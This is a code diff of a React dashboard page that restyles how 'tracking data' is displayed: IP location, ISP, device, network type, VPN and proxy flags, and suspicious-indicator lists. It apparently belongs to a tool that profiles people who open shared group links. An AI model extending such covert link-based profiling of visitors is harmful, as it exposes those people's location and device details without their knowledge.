-                      <p className="text-xs text-[#8696a0]">
-                        ISP: {data.ipLocation.isp}
-                      </p>
-                    )}
-                  </>
-                )}
-                {data.analysis.locationMismatch && (
-                  <p className="text-xs text-red-600 mt-1">⚠️ Location Mismatch</p>
-                )}
-              </div>
-
-              {/* Device */}
-              <div className="mb-4 p-3 bg-[#f0f2f5] rounded-xl">
-                <h3 className="text-sm font-semibold text-[#1f1f1f] mb-3 flex items-center space-x-2">
-                  <Shield className="w-4 h-4 text-[#128C7E]" weight="bold" />
-                  <span>Device Information</span>
-                </h3>
-                <p className="text-xs text-[#667781]">
-                  {data.deviceInfo.type} • {data.deviceInfo.os} • {data.deviceInfo.browser}
-                </p>
-                {data.analysis.deviceMismatch && (
-                  <p className="text-xs text-red-600 mt-1">⚠️ Device Mismatch</p>
-                )}
-              </div>
-
-              {/* Network */}
-              {data.networkInfo && (
-                <div className="mb-4 p-3 bg-[#f0f2f5] rounded-xl">
-                  <h3 className="text-sm font-semibold text-[#1f1f1f] mb-3 flex items-center space-x-2">
-                    <Shield className="w-4 h-4 text-[#128C7E]" weight="bold" />
-                    <span>Network Information</span>
-                  </h3>
-                  <p className="text-xs text-[#667781]">
-                    {data.networkInfo.connectionType} • {data.networkInfo.effectiveType}
-                  </p>
-                  {data.ipLocation?.isVPN && (
-                    <p className="text-xs text-red-600 mt-1">⚠️ VPN Detected</p>
-                  )}
-                  {data.ipLocation?.isProxy && (
-                    <p className="text-xs text-red-600 mt-1">⚠️ Proxy Detected</p>
-                  )}
-                </div>
-              )}
-
-              {/* Flags */}
-              {data.analysis.flags.length > 0 && (
-                <div className="mb-4 p-3 bg-red-50 border-2 border-red-200 rounded-xl">
-                  <h3 className="text-sm font-semibold text-red-700 mb-3 flex items-center space-x-2">
-                    <Warning className="w-4 h-4 text-red-600" weight="fill" />
-                    <span>Suspicious Indicators ({data.analysis.flags.length})</span>
-                  </h3>
-                  <ul className="text-xs text-red-700 space-y-2">
-                    {data.analysis.flags.slice(0, 5).map((flag, i) => (
-                      <li key={i} className="flex items-start space-x-2">
-                        <span className="text-red-500 mt-0.5">•</span>
-                        <span>{flag}</span>
-                      </li>
-                    ))}
-                    {data.analysis.flags.length > 5 && (
-                      <li className="text-red-600 font-semibold">+{data.analysis.flags.length - 5} more flags</li>
-                    )}
-                  </ul>
-                </div>
-              )}
-
-              {/* Footer Info */}
-              <div className="pt-4 border-t-2 border-[#e4e6eb] flex items-center justify-between">
-                <div>
-                  <p className="text-xs text-[#8696a0] mb-1 flex items-center space-x-1">
-                    <Clock className="w-3 h-3" />
-                    <span>{new Date(data.metadata.timestamp).toLocaleString()}</span>
-                  </p>
-                  <p className="text-xs text-[#8696a0] font-mono">
-                    ID: {data.metadata.groupId.substring(0, 10)}...
-                  </p>
-                </div>
-              </div>
-              </div>
-            ))}
+              ))}
             </div>
           ) : (
-            <div className="bg-white rounded-3xl shadow-2xl p-16 text-center border-2 border-[#e4e6eb] max-w-2xl mx-auto">
-              <div className="inline-flex items-center justify-center w-24 h-24 bg-gradient-to-br from-[#e4e6eb] to-[#d1d5db] rounded-full mb-6">
-                <Users className="w-12 h-12 text-[#8696a0]" weight="bold" />
+            <div className="bg-white rounded-xl shadow-md border border-slate-200 p-16 text-center">
+              <div className="inline-flex items-center justify-center w-16 h-16 bg-slate-100 rounded-full mb-4">
+                <Users className="w-8 h-8 text-slate-400" />
               </div>
-              <h3 className="text-2xl font-bold text-[#1f1f1f] mb-3">No Data Available</h3>
-              <p className="text-[#667781] mb-2 text-lg">No tracking data found for the selected filter.</p>
-              <p className="text-sm text-[#8696a0]">Share your group links to start collecting data!</p>
+              <h3 className="text-xl font-bold text-slate-900 mb-2">No Data Available</h3>
+              <p className="text-slate-500 mb-1">No tracking data found for the selected filter.</p>
+              <p className="text-sm text-slate-400">Share your group links to start collecting data!</p>
             </div>
           )}
         </div>
@@ -430,4 +481,3 @@ export default function ViewDataPage() {
     </div>
   );
 }
-
